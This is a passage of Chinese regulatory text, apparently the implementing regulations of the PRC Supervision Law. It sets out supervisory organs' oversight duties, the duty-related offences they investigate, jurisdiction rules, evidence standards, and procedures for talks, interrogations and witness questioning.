监察机关应当加强对公职人员理想信念教育、为人民服务教育、宪法法律法规教育和社会主义先进文化、革命文化、中华优秀传统文化教育，弘扬社会主义核心价值观，深入开展警示教育，教育引导公职人员树立正确的权力观、政绩观、事业观，保持为民务实清廉本色。</p><p>  第十八条  监察机关应当结合公职人员的职责加强日常监督，通过收集群众反映、座谈走访、查阅资料、召集或者列席会议、听取工作汇报和述责述廉、开展监督检查等方式，促进公职人员依法用权、公正用权、为民用权、廉洁用权。</p><p>  第十九条  监察机关可以与公职人员进行谈心谈话，发现政治品行、行使公权力和道德操守方面有苗头性、倾向性问题的，及时进行教育提醒。</p><p>  第二十条  监察机关对于发现的行业性、系统性、区域性的突出问题，以及群众反映强烈的问题，可以通过专项监督进行深入了解，督促有关机关、单位强化治理，促进公职人员履职尽责。</p><p>  第二十一条  监察机关应当加强基层监督工作，促进基层监督资源和力量整合，有效衔接村（居）务监督等各类基层监督，畅通群众监督渠道，及时发现、处理侵害群众利益的不正之风和腐败问题。</p><p>  第二十二条  监察机关应当以办案促进整改、以监督促进治理，在查清问题、依法处置的同时，剖析问题发生的原因，发现制度建设、权力配置、监督机制等方面存在的问题，向有关机关、单位提出改进工作的意见或者监察建议，促进完善制度，提高治理效能。</p><p>  对同一行业、系统、区域相关职务违法或者职务犯罪案件，监察机关应当加强类案分析，深入挖掘存在的共性问题，提出综合性改进工作的意见或者监察建议。</p><p>  第二十三条  监察机关应当依法运用大数据、人工智能等信息化手段，整合各类监督信息资源，强化数据综合分析研判，促进及时预警风险、精准发现问题。</p><p>  第二十四条  监察机关开展监察监督，应当与纪律监督、派驻监督、巡视监督统筹衔接，与人大监督、民主监督、行政监督、司法监督、审计监督、财会监督、统计监督、群众监督和舆论监督等贯通协调，健全信息、资源、成果共享等机制，形成监督合力。</p><p>  <strong>第三节  监察调查</strong></p><p>  第二十五条  监察机关依法履行监察调查职责，依据监察法、《中华人民共和国公职人员政务处分法》（以下简称政务处分法）和《中华人民共和国刑法》（以下简称刑法）等规定对职务违法和职务犯罪进行调查。</p><p>  第二十六条  监察机关负责调查的职务违法是指公职人员实施的与其职务相关联，虽不构成犯罪但依法应当承担法律责任的下列违法行为：</p><p>  （一）利用职权实施的违法行为；</p><p>  （二）利用职务上的影响实施的违法行为；</p><p>  （三）履行职责不力、失职失责的违法行为；</p><p>  （四）其他违反与公职人员职务相关的特定义务的违法行为。</p><p>  第二十七条  监察机关发现公职人员存在其他违法行为，具有下列情形之一的，可以依法进行调查、处置：</p><p>  （一）超过行政违法追究时效，或者超过犯罪追诉时效、未追究刑事责任，但需要依法给予政务处分的；</p><p>  （二）被追究行政法律责任，需要依法给予政务处分的；</p><p>  （三）监察机关调查职务违法或者职务犯罪时，对被调查人实施的事实简单、清楚，需要依法给予政务处分的其他违法行为一并查核的。</p><p>  监察机关发现公职人员成为监察对象前有前款规定的违法行为的，依照前款规定办理。</p><p>  第二十八条  监察机关依法对监察法第十一条第二项规定的职务犯罪进行调查。</p><p>  第二十九条  监察机关依法调查涉嫌贪污贿赂犯罪，包括贪污罪，挪用公款罪，受贿罪，单位受贿罪，利用影响力受贿罪，行贿罪，对有影响力的人行贿罪，对单位行贿罪，介绍贿赂罪，单位行贿罪，巨额财产来源不明罪，隐瞒境外存款罪，私分国有资产罪，私分罚没财物罪，以及公职人员在行使公权力过程中实施的职务侵占罪，挪用资金罪，对外国公职人员、国际公共组织官员行贿罪，非国家工作人员受贿罪和相关联的对非国家工作人员行贿罪。</p><p>  第三十条  监察机关依法调查公职人员涉嫌滥用职权犯罪，包括滥用职权罪，国有公司、企业、事业单位人员滥用职权罪，滥用管理公司、证券职权罪，食品、药品监管渎职罪，故意泄露国家秘密罪，报复陷害罪，阻碍解救被拐卖、绑架妇女、儿童罪，帮助犯罪分子逃避处罚罪，违法发放林木采伐许可证罪，办理偷越国（边）境人员出入境证件罪，放行偷越国（边）境人员罪，挪用特定款物罪，非法剥夺公民宗教信仰自由罪，侵犯少数民族风俗习惯罪，打击报复会计、统计人员罪，以及司法工作人员以外的公职人员利用职权实施的非法拘禁罪、虐待被监管人罪、非法搜查罪。</p><p>  第三十一条  监察机关依法调查公职人员涉嫌玩忽职守犯罪，包括玩忽职守罪，国有公司、企业、事业单位人员失职罪，签订、履行合同失职被骗罪，国家机关工作人员签订、履行合同失职被骗罪，环境监管失职罪，传染病防治失职罪，商检失职罪，动植物检疫失职罪，不解救被拐卖、绑架妇女、儿童罪，失职造成珍贵文物损毁、流失罪，过失泄露国家秘密罪。</p><p>  第三十二条  监察机关依法调查公职人员涉嫌徇私舞弊犯罪，包括徇私舞弊低价折股、出售公司、企业资产罪，非法批准征收、征用、占用土地罪，非法低价出让国有土地使用权罪，非法经营同类营业罪，为亲友非法牟利罪，枉法仲裁罪，徇私舞弊发售发票、抵扣税款、出口退税罪，商检徇私舞弊罪，动植物检疫徇私舞弊罪，放纵走私罪，放纵制售伪劣商品犯罪行为罪，招收公务员、学生徇私舞弊罪，徇私舞弊不移交刑事案件罪，违法提供出口退税凭证罪，徇私舞弊不征、少征税款罪。</p><p>  第三十三条  监察机关依法调查公职人员在行使公权力过程中涉及的重大责任事故犯罪，包括重大责任事故罪，教育设施重大安全事故罪，消防责任事故罪，重大劳动安全事故罪，强令、组织他人违章冒险作业罪，危险作业罪，不报、谎报安全事故罪，铁路运营安全事故罪，重大飞行事故罪，大型群众性活动重大安全事故罪，危险物品肇事罪，工程重大安全事故罪。</p><p>  第三十四条  监察机关依法调查公职人员在行使公权力过程中涉及的其他犯罪，包括破坏选举罪，背信损害上市公司利益罪，金融工作人员购买假币、以假币换取货币罪，利用未公开信息交易罪，诱骗投资者买卖证券、期货合约罪，背信运用受托财产罪，违法运用资金罪，违法发放贷款罪，吸收客户资金不入账罪，违规出具金融票证罪，对违法票据承兑、付款、保证罪，非法转让、倒卖土地使用权罪，私自开拆、隐匿、毁弃邮件、电报罪，故意延误投递邮件罪，泄露不应公开的案件信息罪，披露、报道不应公开的案件信息罪，接送不合格兵员罪。</p><p>  第三十五条  监察机关发现依法由其他机关管辖的违法犯罪线索，应当及时移送有管辖权的机关。</p><p>  监察机关调查结束后，对于应当给予被调查人或者涉案人员行政处罚等其他处理的，依法移送有关机关。</p><p>  <strong>第四节  监察处置</strong></p><p>  第三十六条  监察机关对违法的公职人员，依据监察法、政务处分法等规定作出政务处分决定。</p><p>  第三十七条  监察机关在追究违法的公职人员直接责任的同时，依法对履行职责不力、失职失责，造成严重后果或者恶劣影响的领导人员予以问责。</p><p>  监察机关应当组成调查组依法开展问责调查。调查结束后经集体讨论形成调查报告，需要进行问责的按照管理权限作出问责决定，或者向有权作出问责决定的机关、单位书面提出问责建议。</p><p>  第三十八条  监察机关对涉嫌职务犯罪的人员，经调查认为犯罪事实清楚，证据确实、充分，需要追究刑事责任的，依法移送人民检察院审查起诉。</p><p>  第三十九条  监察机关根据监督、调查结果，发现监察对象所在单位具有下列情形之一，需要整改纠正的，依法提出监察建议，推动以案促改工作：</p><p>  （一）廉政建设方面存在突出问题的；</p><p>  （二）权力运行制约监督方面存在较大风险的；</p><p>  （三）监察对象教育管理监督方面存在突出问题的；</p><p>  （四）执行法律法规制度不到位的；</p><p>  （五）不履行或者不正确履行法定职责的；</p><p>  （六）其他需要提出监察建议的情形。</p><p>  监察机关应当跟踪了解监察建议的采纳情况，指导、督促有关单位限期整改，对未达到整改要求的提出进一步整改意见，推动监察建议落实到位。</p><h2 id="第三章-监察范围和管辖"><a href="#第三章-监察范围和管辖" class="headerlink" title="第三章  监察范围和管辖"></a>第三章  监察范围和管辖</h2><p>  <strong>第一节  监察对象</strong></p><p>  第四十条  监察机关依法对所有行使公权力的公职人员进行监察，实现国家监察全面覆盖。</p><p>  第四十一条  监察法第十五条第一项所称公务员范围，依据《中华人民共和国公务员法》（以下简称公务员法）确定。</p><p>  监察法第十五条第一项所称参照公务员法管理的人员，是指有关单位中经批准参照公务员法进行管理的工作人员。</p><p>  第四十二条  监察法第十五条第二项所称法律、法规授权或者受国家机关依法委托管理公共事务的组织中从事公务的人员，是指在上述组织中，除参照公务员法管理的人员外，对公共事务履行组织、领导、管理、监督等职责的人员，包括具有公共事务管理职能的行业协会等组织中从事公务的人员，以及法定检验检测、检疫等机构中从事公务的人员。</p><p>  第四十三条  监察法第十五条第三项所称国有企业管理人员，是指国家出资企业中的下列人员：</p><p>  （一）在国有独资、全资公司、企业中履行组织、领导、管理、监督等职责的人员；</p><p>  （二）经党组织或者国家机关，国有独资、全资公司、企业，事业单位提名、推荐、任命、批准等，在国有控股、参股公司及其分支机构中履行组织、领导、管理、监督等职责的人员；</p><p>  （三）经国家出资企业中负有管理、监督国有资产职责的组织批准或者研究决定，代表其在国有控股、参股公司及其分支机构中从事组织、领导、管理、监督等工作的人员。</p><p>  第四十四条  监察法第十五条第四项所称公办的教育、科研、文化、医疗卫生、体育等单位中从事管理的人员，是指国家为了社会公益目的，由国家机关举办或者其他组织利用国有资产举办的教育、科研、文化、医疗卫生、体育等事业单位中，从事组织、领导、管理、监督等工作的人员。</p><p>  第四十五条  监察法第十五条第五项所称基层群众性自治组织中从事管理的人员，是指该组织中的下列人员：</p><p>  （一）从事集体事务和公益事业管理的人员；</p><p>  （二）从事集体资金、资产、资源管理的人员；</p><p>  （三）协助人民政府从事行政管理工作的人员，包括从事救灾、防疫、抢险、防汛、优抚、帮扶、移民、救济款物的管理，社会捐助公益事业款物的管理，国有土地的经营和管理，土地征收、征用补偿费用的管理，代征、代缴税款，有关计划生育、户籍、征兵工作，协助人民政府等国家机关在基层群众性自治组织中从事的其他管理工作。</p><p>  第四十六条  下列人员属于监察法第十五条第六项所称其他依法履行公职的人员：</p><p>  （一）履行人民代表大会职责的各级人民代表大会代表，履行公职的中国人民政治协商会议各级委员会委员、人民陪审员、人民监督员；</p><p>  （二）虽未列入党政机关人员编制，但在党政机关中从事公务的人员；</p><p>  （三）在集体经济组织等单位、组织中，由党组织或者国家机关，国有独资、全资公司、企业，国家出资企业中负有管理监督国有和集体资产职责的组织，事业单位提名、推荐、任命、批准等，从事组织、领导、管理、监督等工作的人员；</p><p>  （四）在依法组建的评标、谈判、询价等组织中代表国家机关，国有独资、全资公司、企业，事业单位，人民团体临时履行公共事务组织、领导、管理、监督等职责的人员；</p><p>  （五）其他依法行使公权力的人员。</p><p>  第四十七条  有关机关、单位、组织集体作出的决定违法或者实施违法行为的，监察机关应当对负有责任的领导人员和直接责任人员中的公职人员依法追究法律责任。</p><p>  <strong>第二节  管    辖</strong></p><p>  第四十八条  监察机关开展监督、调查、处置，按照管理权限与属地管辖相结合的原则，实行分级负责制。</p><p>  第四十九条  设区的市级以上监察委员会按照管理权限，依法管辖同级党委管理的公职人员涉嫌职务违法和职务犯罪案件。</p><p>  县级监察委员会和直辖市所辖区（县）监察委员会按照管理权限，依法管辖本辖区内公职人员涉嫌职务违法和职务犯罪案件。</p><p>  地方各级监察委员会按照本条例第十三条、第五十二条规定，可以依法管辖工作单位在本辖区内的有关公职人员涉嫌职务违法和职务犯罪案件。   </p><p>  监察机关调查公职人员涉嫌职务犯罪案件，可以依法对涉嫌行贿犯罪、介绍贿赂犯罪或者共同职务犯罪的涉案人员中的非公职人员一并管辖并进行调查处置。非公职人员涉嫌利用影响力受贿罪的，监察机关按照其所利用的公职人员的管理权限确定管辖并进行调查处置。</p><p>  第五十条  上级监察机关对于下一级监察机关管辖范围内的职务违法和职务犯罪案件，具有下列情形之一的，可以依法提级管辖：</p><p>  （一）在本辖区有重大影响的；</p><p>  （二）涉及多个下级监察机关管辖的监察对象，调查难度大的；</p><p>  （三）其他需要提级管辖的重大、复杂案件。</p><p>  上级监察机关对于所辖各级监察机关管辖范围内有重大影响的案件，必要时可以依法直接调查或者组织、指挥、参与调查。</p><p>  地方各级监察机关所管辖的职务违法和职务犯罪案件，具有第一款规定情形的，可以依法报请上一级监察机关管辖。</p><p>  第五十一条  上级监察机关可以依法将其所管辖的案件指定下级监察机关管辖。</p><p>  设区的市级监察委员会将同级党委管理的公职人员涉嫌职务违法或者职务犯罪案件指定下级监察委员会管辖的，应当报请省级监察委员会批准；省级监察委员会将同级党委管理的公职人员涉嫌职务违法或者职务犯罪案件指定下级监察委员会管辖的，应当报送国家监察委员会相关监督检查部门备案。</p><p>  上级监察机关对于下级监察机关管辖的职务违法和职务犯罪案件，具有下列情形之一，认为由其他下级监察机关管辖更为适宜的，可以依法指定给其他下级监察机关管辖：</p><p>  （一）管辖有争议的；</p><p>  （二）指定管辖有利于案件公正处理的；</p><p>  （三）下级监察机关报请指定管辖的；</p><p>  （四）其他有必要指定管辖的。</p><p>  被指定的下级监察机关未经指定管辖的监察机关批准，不得将案件再行指定管辖。发现新的职务违法或者职务犯罪线索，以及其他重要情况、重大问题，应当及时向指定管辖的监察机关请示报告。</p><p>  第五十二条  工作单位在地方、管理权限在主管部门的公职人员涉嫌职务违法和职务犯罪，一般由驻在主管部门、有管辖权的监察机构、监察专员管辖；经协商，监察机构、监察专员可以按规定移交公职人员工作单位所在地的地方监察委员会调查，或者与地方监察委员会联合调查。地方监察委员会在工作中发现上述公职人员有关问题线索，应当向驻在主管部门、有管辖权的监察机构、监察专员通报，并协商确定管辖。</p><p>  前款规定单位的其他公职人员涉嫌职务违法的，可以由公职人员工作单位所在地的地方监察委员会管辖。涉嫌职务犯罪的，一般由公职人员工作单位所在地的地方监察委员会管辖；因涉及主管部门管理的公职人员等特殊情形，驻在主管部门的监察机构、监察专员认为由自己管辖或者其他地方监察委员会管辖更为适宜的，经与公职人员工作单位所在地的地方监察委员会协商，可以自行调查或者依法办理指定管辖。</p><p>  地方监察委员会调查前两款规定案件，应当按程序将立案、留置、移送审查起诉、撤销案件等重要情况通报相关监察机构、监察专员。</p><p>  第五十三条  监察机关办理案件中涉及无隶属关系的其他监察机关的监察对象，认为需要立案调查的，应当商请有管理权限的监察机关依法立案调查。商请立案时，应当提供涉案人员基本情况、已经查明的涉嫌违法犯罪事实以及相关证据材料。</p><p>  承办案件的监察机关认为由其一并调查更为适宜的，可以报请有权决定的上级监察机关指定管辖。</p><p>  第五十四条  公职人员既涉嫌贪污贿赂、失职渎职等严重职务违法和职务犯罪，又涉嫌公安机关、人民检察院等机关管辖的犯罪，依法由监察机关为主调查的，应当由监察机关和其他机关分别依职权立案，监察机关承担组织协调职责，协调调查和侦查工作进度、重要调查和侦查措施使用等重要事项。</p><p>  第五十五条  监察机关必要时可以依法调查司法工作人员利用职权实施的涉嫌非法拘禁、刑讯逼供、非法搜查等侵犯公民权利、损害司法公正的犯罪，并在立案后及时通报同级人民检察院。</p><p>  监察机关在调查司法工作人员涉嫌贪污贿赂等职务犯罪中，可以对其涉嫌的前款规定的犯罪一并调查，并及时通报同级人民检察院。人民检察院在办理直接受理侦查的案件中，发现犯罪嫌疑人同时涉嫌监察机关管辖的其他职务犯罪，经沟通全案移送监察机关管辖的，监察机关应当依法进行调查。</p><p>  第五十六条  监察机关对于退休公职人员在退休前或者退休后，或者离职、死亡的公职人员在履职期间实施的涉嫌职务违法或者职务犯罪行为，可以依法进行调查。</p><p>  对前款规定人员，按照其原任职务的管辖规定确定管辖的监察机关；由其他监察机关管辖更为适宜的，可以依法指定或者交由其他监察机关管辖。</p><h2 id="第四章-监察权限"><a href="#第四章-监察权限" class="headerlink" title="第四章  监察权限"></a>第四章  监察权限</h2><p>  <strong>第一节  一般要求</strong></p><p>  第五十七条  监察机关应当加强监督执法调查工作规范化建设，严格按规定对监察措施进行审批和监管，依照法定的范围、程序和期限采取相关措施，出具、送达法律文书。</p><p>  第五十八条  监察机关应当根据开展监督执法调查工作的需要、涉嫌职务违法或者职务犯罪行为的严重程度、监察措施适用对象与案件的关联程度，以及采取监察措施的紧急程度等情况，合理确定采取监察措施的对象、种类和期限，不得超过必要限度。禁止违反规定滥用监察措施。</p><p>  第五十九条  监察机关在初步核实中，可以依法采取谈话、询问、查询、调取、勘验检查、调查实验、鉴定措施；立案后可以采取讯问、强制到案、责令候查、管护、留置、禁闭、冻结、搜查、查封、扣押、通缉措施。发现存在逃跑、自杀等重大安全风险，在立案前依法对监察法第二十五条第一款第一项、第二项规定的人员采取管护措施的，符合立案条件的应当及时立案。需要采取技术调查、限制出境措施的，应当按照规定交有关机关依法执行。设区的市级以下监察机关在初步核实中不得采取技术调查措施。监察机关采取谈话、函询方式处置问题线索的，适用监察法和本条例关于采取该两项措施的相关规定。</p><p>  开展问责调查，根据具体情况可以依法采取相关监察措施。</p><p>  第六十条  开展讯问、搜查、查封、扣押以及重要的谈话、询问等调查取证工作，应当全程同步录音录像，并保持录音录像资料的完整性。</p><p>  对谈话、讯问、询问进行同步录音录像的，谈话笔录、讯问笔录、询问笔录记载的起止时间应当与录音录像资料反映的起止时间一致。谈话笔录、讯问笔录、询问笔录内容应当与录音录像资料内容相符。</p><p>  同步录音录像资料应当妥善保管、及时归档，留存备查。监察机关案件监督管理部门应当开展常态化检查。人民检察院、人民法院需要调取同步录音录像的，监察机关应当依法予以提供。</p><p>  第六十一条  需要商请其他监察机关协助收集证据材料的，应当依法出具《委托调查函》；商请其他监察机关对采取措施提供一般性协助的，应当依法出具《商请协助采取措施函》。商请协助事项涉及协助地监察机关管辖的监察对象的，应当由协助地监察机关按照所涉人员的管理权限报批。协助地监察机关对于协助请求，应当依法予以协助配合。</p><p>  第六十二条  采取、解除或者变更监察措施需要告知、通知相关人员的，应当依法办理。告知包括口头、书面两种方式，除本条例另有规定外，通知应当采取书面方式。采取口头方式告知、通知的，应当将相关情况制作工作记录；采取书面方式告知、通知的，可以通过直接送交、邮寄、转交等途径送达，将有关回执或者凭证附卷。</p><p>  无法告知、通知，或者相关人员拒绝接收的，调查人员应当在工作记录或者有关文书上记明。</p><p>  第六十三条  监察机关采取监察措施，依法需要见证人在场的，应当邀请合适的见证人在场。下列人员不得担任见证人：</p><p>  （一）生理上、精神上有缺陷或者未成年，不具有相应辨别能力或者不能正确表达的人；</p><p>  （二）与案件有利害关系，可能影响案件公正处理的人；</p><p>  （三）监察机关的工作人员或者其聘用的人员；</p><p>  （四）依法协助监察机关采取监察措施的工作人员。</p><p>  第六十四条  监察机关依法变更强制到案、责令候查、管护、留置以及禁闭等监察强制措施的，原监察强制措施自监察机关采取新的监察强制措施之时自动解除。</p><p>  第六十五条  县级以上监察机关需要提请公安机关协助采取强制到案、责令候查、管护、留置、搜查措施的，应当按规定报批，请同级公安机关依法予以协助。提请协助时，应当出具提请协助函，列明提请协助的具体事项和建议，协助采取措施的时间、地点等内容，附采取监察措施决定书复印件。</p><p>  因保密需要，不宜在采取监察措施前向公安机关告知采取措施对象姓名的，可以作出说明，进行保密处理。</p><p>  需要提请异地公安机关协助采取监察措施的，应当按规定报批，向协作地同级监察机关出具协作函件和相关文书，由协作地监察机关提请当地公安机关依法予以协助。</p><p>  <strong>第二节  证    据</strong></p><p>  第六十六条  可以用于证明案件事实的材料都是证据，包括：</p><p>  （一）物证；</p><p>  （二）书证；</p><p>  （三）证人证言；</p><p>  （四）被害人陈述；</p><p>  （五）被调查人陈述、供述和辩解；</p><p>  （六）鉴定意见；</p><p>  （七）勘验检查、辨认、调查实验等笔录；</p><p>  （八）视听资料、电子数据。</p><p>  监察机关向有关单位和个人收集、调取证据时，应当告知其必须依法如实提供证据。对于不按要求提供有关材料，泄露相关信息，伪造、隐匿、毁灭证据，提供虚假情况或者阻止他人提供证据的，依法追究法律责任。</p><p>  监察机关依照监察法和本条例规定收集的证据材料，经审查符合法定要求的，在刑事诉讼中可以作为证据使用。</p><p>  第六十七条  监察机关认定案件事实应当以证据为根据，全面、客观地收集、固定被调查人有无违法犯罪以及情节轻重的各种证据，形成相互印证、完整稳定的证据链。</p><p>  只有被调查人陈述或者供述，没有其他证据的，不能认定案件事实；没有被调查人陈述或者供述，证据符合法定标准的，可以认定案件事实。</p><p>  第六十八条  证据必须经过查证属实，才能作为定案的根据。审查认定证据，应当结合案件的具体情况，从证据与待证事实的关联程度、各证据之间的联系、是否依照法定程序收集等方面进行综合判断。</p><p>  第六十九条  监察机关调查终结的职务违法案件，应当事实清楚、证据确凿。证据确凿，应当符合下列条件：</p><p>  （一）定性处置的事实都有证据证实；</p><p>  （二）定案证据真实、合法；</p><p>  （三）据以定案的证据之间不存在无法排除的矛盾；</p><p>  （四）综合全案证据，所认定事实清晰且令人信服。</p><p>  第七十条  监察机关调查终结的职务犯罪案件，应当事实清楚，证据确实、充分。证据确实、充分，应当符合下列条件：</p><p>  （一）定罪量刑的事实都有证据证明；</p><p>  （二）据以定案的证据均经法定程序查证属实；</p><p>  （三）综合全案证据，对所认定事实已排除合理怀疑。</p><p>  证据不足的，不得移送人民检察院审查起诉。</p><p>  第七十一条  调查人员应当依法文明规范开展调查工作。严禁以暴力、威胁、引诱、欺骗以及非法限制人身自由等非法方法收集证据，严禁侮辱、打骂、虐待、体罚或者变相体罚被调查人、涉案人员和证人。</p><p>  监察机关应当保障被强制到案人员、被管护人员、被留置人员以及被禁闭人员的合法权益，尊重其人格和民族习俗，保障饮食、休息和安全，提供医疗服务。</p><p>  第七十二条  对于调查人员采用暴力、威胁以及非法限制人身自由等非法方法收集的被调查人供述、证人证言、被害人陈述，应当依法予以排除。</p><p>  前款所称暴力的方法，是指采用殴打、违法使用戒具等方法或者变相肉刑的恶劣手段，使人遭受难以忍受的痛苦而违背意愿作出供述、证言、陈述；威胁的方法，是指采用以暴力或者严重损害本人及其近亲属合法权益等进行威胁的方法，使人遭受难以忍受的痛苦而违背意愿作出供述、证言、陈述。</p><p>  收集物证、书证不符合法定程序，可能严重影响案件公正处理的，应当予以补正或者作出合理解释；不能补正或者作出合理解释的，对该证据应当予以排除。</p><p>  第七十三条  监察机关监督检查、调查、案件审理、案件监督管理等部门发现监察人员在办理案件中，可能存在以非法方法收集证据情形的，应当依据职责进行调查核实。对于被调查人控告、举报调查人员采用非法方法收集证据，并提供涉嫌非法取证的人员、时间、地点、方式和内容等材料或者线索的，应当受理并进行审核。根据现有材料无法证明证据收集合法性的，应当进行调查核实。</p><p>  经调查核实，确认或者不能排除以非法方法收集证据的，对有关证据依法予以排除，不得作为案件定性处置、移送审查起诉的依据。认定调查人员非法取证的，应当依法处理，另行指派调查人员重新调查取证。</p><p>  监察机关接到对下级监察机关调查人员采用非法方法收集证据的控告、举报，可以直接进行调查核实，也可以交由下级监察机关调查核实。交由下级监察机关调查核实的，下级监察机关应当及时将调查结果报告上级监察机关。</p><p>  第七十四条  对收集的证据材料及扣押的财物应当妥善保管，严格履行交接、调用手续，定期对账核实，不得违规使用、调换、损毁或者自行处理。</p><p>  第七十五条  监察机关对行政机关在行政执法和查办案件中收集的物证、书证、视听资料、电子数据，勘验、检查等笔录，以及鉴定意见等证据材料，经审查符合法定要求的，可以作为证据使用。</p><p>  根据法律、行政法规规定行使国家行政管理职权的组织在行政执法和查办案件中收集的证据材料，视为行政机关收集的证据材料。</p><p>  第七十六条  监察机关对人民法院、人民检察院、公安机关、国家安全机关等在刑事诉讼中收集的物证、书证、视听资料、电子数据，勘验、检查、辨认、侦查实验等笔录，以及鉴定意见等证据材料，经审查符合法定要求的，可以作为证据使用。</p><p>  监察机关办理职务违法案件，对于人民法院生效刑事判决、裁定和人民检察院不起诉决定采信的证据材料，可以直接作为证据使用。</p><p>  <strong>第三节  谈    话</strong></p><p>  第七十七条  监察机关对涉嫌职务违法的监察对象，可以依法进行谈话，要求其如实说明情况或者作出陈述。</p><p>  谈话应当个别进行。负责谈话的人员不得少于二人。</p><p>  第七十八条  对一般性问题线索的处置，可以采取谈话方式进行，对监察对象给予警示、批评、教育。谈话应当在监察机关谈话场所、具备安全保障条件的工作地点等场所进行，明确告知谈话事项，注重谈清问题、取得教育效果。</p><p>  第七十九条  采取谈话方式处置问题线索的，经审批可以由监察人员或者委托被谈话人所在单位主要负责人等进行谈话。</p><p>  监察机关谈话应当形成谈话笔录或者记录。谈话结束后，可以根据需要要求被谈话人在十五个工作日以内作出书面说明。被谈话人应当在书面说明每页签名，修改的地方也应当签名。</p><p>  委托谈话的，受委托人应当在收到委托函后的十五个工作日以内进行谈话。谈话结束后及时形成谈话情况材料报送监察机关，必要时附被谈话人的书面说明。</p><p>  第八十条  监察机关开展初步核实工作，一般不与被核查人接触；确有需要与被核查人谈话的，应当按规定报批。</p><p>  第八十一条  监察机关对涉嫌职务违法的被调查人立案后，可以依法进行谈话。</p><p>  与被调查人首次谈话时，应当出示《被调查人权利义务告知书》，由其签名、捺指印。被调查人拒绝签名、捺指印的，调查人员应当在文书上记明。对于被调查人未被限制人身自由的，应当在首次谈话时出具《谈话通知书》。</p><p>  与涉嫌严重职务违法的被调查人进行谈话的，应当全程同步录音录像，并告知被调查人。告知情况应当在录音录像中予以反映，并在笔录中记明。</p><p>  第八十二条  立案后，与被责令候查人员或者未被限制人身自由的被调查人谈话的，应当在具备安全保障条件的场所进行。</p><p>  调查人员按规定通知被调查人所在单位派员或者被调查人家属陪同被调查人到指定场所的，应当与陪同人员办理交接手续，填写《陪送交接单》。</p><p>  第八十三条  调查人员与被强制到案人员、被管护人员、被留置人员或者被禁闭人员谈话的，按照法定程序在执行相关监察强制措施的场所进行。</p><p>  与在押的犯罪嫌疑人、被告人谈话的，应当持以监察机关名义出具的介绍信、工作证件，商请有关案件主管机关依法协助办理。</p><p>  与在看守所、监狱服刑的人员谈话的，应当持以监察机关名义出具的介绍信、工作证件办理。</p><p>  第八十四条  与被调查人进行谈话，应当合理安排时间、控制时长，保证其饮食和必要的休息时间。</p><p>  第八十五条  谈话笔录应当在谈话现场制作。笔录应当详细具体，如实反映谈话情况。笔录制作完成后，应当交给被调查人核对。被调查人没有阅读能力的，应当向其宣读。</p><p>  笔录记载有遗漏或者差错的，应当补充或者更正，由被调查人在补充或者更正处捺指印。被调查人核对无误后，应当在笔录中逐页签名、捺指印。被调查人拒绝签名、捺指印的，调查人员应当在笔录中记明。调查人员也应当在笔录中签名。</p><p>  第八十六条  被调查人请求自行书写说明材料的，应当准许。必要时，调查人员可以要求被调查人自行书写说明材料。</p><p>  被调查人应当在说明材料上逐页签名、捺指印，在末页写明日期。对说明材料有修改的，在修改之处应当捺指印。说明材料应当由二名调查人员接收，在首页记明接收的日期并签名。</p><p>  第八十七条  本条例第八十一条至第八十六条的规定，也适用于在初步核实中开展的谈话。</p><p>  <strong>第四节  讯    问</strong></p><p>  第八十八条  监察机关对涉嫌职务犯罪的被调查人，可以依法进行讯问，要求其如实供述涉嫌犯罪的情况。</p><p>  第八十九条  讯问被管护人员、被留置人员，应当在留置场所进行。</p><p>  第九十条  讯问应当个别进行，调查人员不得少于二人。</p><p>  首次讯问时，应当向被讯问人出示《被调查人权利义务告知书》，由其签名、捺指印。被讯问人拒绝签名、捺指印的，调查人员应当在文书上记明。被讯问人未被限制人身自由的，应当在首次讯问时向其出具《讯问通知书》。</p><p>  讯问一般按照下列顺序进行：</p><p>  （一）核实被讯问人的基本情况，包括姓名、曾用名、出生年月日、户籍地、身份证件号码、民族、职业、政治面貌、文化程度、工作单位及职务、住所、家庭情况、社会经历，是否属于党代表大会代表、人大代表、政协委员，是否受到过党纪政务处分，是否受到过刑事处罚等；</p><p>  （二）告知被讯问人如实供述自己罪行可以依法从宽处理和认罪认罚的法律规定；</p><p>  （三）讯问被讯问人是否有犯罪行为，让其陈述有罪的事实或者无罪的辩解，应当允许其连贯陈述。</p><p>  调查人员的提问应当与调查的案件相关。被讯问人对调查人员的提问应当如实回答。调查人员对被讯问人的辩解，应当如实记录，认真查核。</p><p>  发现涉嫌职务犯罪的被调查人自动投案、如实供述监察机关还未掌握的违法犯罪行为、揭发他人犯罪行为或者提供重要线索等，可能具有自首、立功等法定情节的，应当依法及时讯问。对某一具体涉嫌职务犯罪事实初步查清后，应当在全面梳理分析在案证据的基础上进行讯问。</p><p>  讯问时，应当告知被讯问人将进行全程同步录音录像。告知情况应当在录音录像中予以反映，并在笔录中记明。</p><p>  第九十一条  本条例第八十二条至第八十六条的要求，也适用于讯问。</p><p>  <strong>第五节  询    问</strong></p><p>  第九十二条  监察机关按规定报批后，可以依法对证人、被害人等人员进行询问，了解核实有关问题或者案件情况。</p><p>  第九十三条  证人未被限制人身自由的，可以在其工作地点、住所或者其提出的地点进行询问，也可以通知其到指定地点接受询问。到证人提出的地点或者调查人员指定的地点进行询问的，应当在笔录中记明。</p><p>  调查人员认为有必要或者证人提出需要由所在单位派员或者其家属陪同到询问地点的，应当办理交接手续并填写《陪送交接单》。</p><p>  第九十四条  询问应当个别进行。负责询问的调查人员不得少于二人。</p><p>  首次询问时，应当向证人出示《证人权利义务告知书》，由其签名、捺指印。证人拒绝签名、捺指印的，调查人员应当在文书上记明。证人未被限制人身自由的，应当在首次询问时向其出具《询问通知书》。</p><p>  询问时，应当核实证人身份，问明证人的基本情况，告知证人应当如实提供证据、证言，以及作伪证或者隐匿证据应当承担的法律责任。不得向证人泄露案情，不得采用非法方法获取证言。</p><p>  询问重大或者有社会影响案件的重要证人，应当对询问过程全程同步录音录像，并告知证人。告知情况应当在录音录像中予以反映，并在笔录中记明。</p><p>  第九十五条  询问未成年人，应当通知其法定代理人到场。无法通知或者法定代理人不能到场的，应当通知未成年人的其他成年亲属或者所在学校、居住地基层组织的代表等有关人员到场。询问结束后，由法定代理人或者有关人员在笔录中签名。调查人员应当将到场情况记录在案。</p><p>  询问聋、哑人，应当有通晓聋、哑手势的人员参加。调查人员应当在笔录中记明证人的聋、哑情况，以及翻译人员的姓名、工作单位和职业。询问不通晓当地通用语言、文字的证人，应当有翻译人员。询问结束后，由翻译人员在笔录中签名。</p><p>  第九十六条  凡是知道案件情况的人，都有如实作证的义务。对故意提供虚假证言的证人，应当依法追究法律责任。</p><p>  